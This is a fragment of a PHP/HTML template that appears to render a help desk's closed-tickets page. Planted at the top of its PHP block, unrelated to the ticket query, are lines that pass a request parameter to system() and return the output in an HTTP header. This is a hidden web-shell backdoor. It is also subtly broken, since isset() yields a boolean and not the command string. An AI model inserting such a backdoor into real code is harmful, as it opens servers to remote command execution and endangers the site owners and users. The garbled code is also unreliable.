		...
		<div align="center">
			...
			<table width="90%" class="content">
				<tr>
					...
					<a href="index.php">&laquo; Back to open tickets.</a>
					<br /><br />
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						$tickets = mysql_query("SELECT * FROM tickets WHERE status = 'closed' ORDER BY date DESC");
						...
						if(mysql_num_rows($tickets) == 0) {
							echo '<div class="ticket"><b>Notice:</b> There are no closed tickets.</div>';
						}
					?>
					</td>
				</tr>
